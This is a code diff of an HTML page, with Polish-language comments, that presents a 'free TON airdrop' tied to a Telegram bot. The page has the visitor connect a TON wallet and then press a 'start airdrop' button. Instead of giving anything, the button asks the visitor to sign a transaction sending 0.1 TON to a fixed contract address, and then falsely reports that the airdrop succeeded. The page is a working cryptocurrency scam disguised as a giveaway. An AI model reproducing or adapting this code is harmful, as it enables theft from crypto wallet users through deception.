@@ -10,38 +10,48 @@
 
 <body>
     <div class="center" id="ton-connect"></div>
-    <script> const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json', buttonRootId: 'ton-connect' }); tonConnectUI.uiOptions = { twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot' };  </script>
-    <button id="start-airdrop" >Rozpocznij Airdrop</button>
+    <button id="start-airdrop" style="display: none;">Rozpocznij Airdrop</button>
 
-<script>
-    const startAirdropButton = document.getElementById('start-airdrop');
-    tonConnectUI.onStatusChange((status) => {
-        if (status === 'connected') {
-            startAirdropButton.style.display = 'block'; // Pokaż przycisk po połączeniu
-        }
-    });
-    startAirdropButton.addEventListener('click', async () => {
-    try {
-        // Ustal adres kontraktu i ilość TON do wymiany
-        const contractAddress = 'EQDcwc2whoTvG3Q81iztMKE1CHLZZdXGXgth2mxJ1cNmGgTi';
-        const amountInTon = '0.1'; // na przykład
+    <script>
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect'
+        });
+        tonConnectUI.uiOptions = {
+            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
+        };
 
-        // Utwórz i podpisz transakcję
-        const result = await tonConnectUI.sendTransaction({
-            to: contractAddress,
-            value: amountInTon,
-            data: '', // opcjonalnie dane, które wymaga kontrakt
+        const startAirdropButton = document.getElementById('start-airdrop');
+
+        // Pokaż przycisk "Rozpocznij Airdrop" po podłączeniu portfela
+        tonConnectUI.onStatusChange((status) => {
+            if (status === 'connected') {
+                startAirdropButton.style.display = 'block';
+            }
         });
 
-        console.log('Transakcja pomyślna:', result);
-        alert('Airdrop zakończony sukcesem!');
+        startAirdropButton.addEventListener('click', async () => {
+            try {
+                // Ustal adres kontraktu i ilość TON do wymiany
+                const contractAddress = 'EQDcwc2whoTvG3Q81iztMKE1CHLZZdXGXgth2mxJ1cNmGgTi';
+                const amountInTon = '0.1'; // na przykład
 
-    } catch (error) {
-        console.error('Błąd transakcji:', error);
-        alert('Airdrop nie powiódł się.');
-    }
-});
-</script>
+                // Utwórz i podpisz transakcję
+                const result = await tonConnectUI.sendTransaction({
+                    to: contractAddress,
+                    value: amountInTon,
+                    data: '' // opcjonalnie dane, które wymaga kontrakt
+                });
+
+                console.log('Transakcja pomyślna:', result);
+                alert('Airdrop zakończony sukcesem!');
+
+            } catch (error) {
+                console.error('Błąd transakcji:', error);
+                alert('Airdrop nie powiódł się.');
+            }
+        });
+    </script>
 </body>
 
 </html>
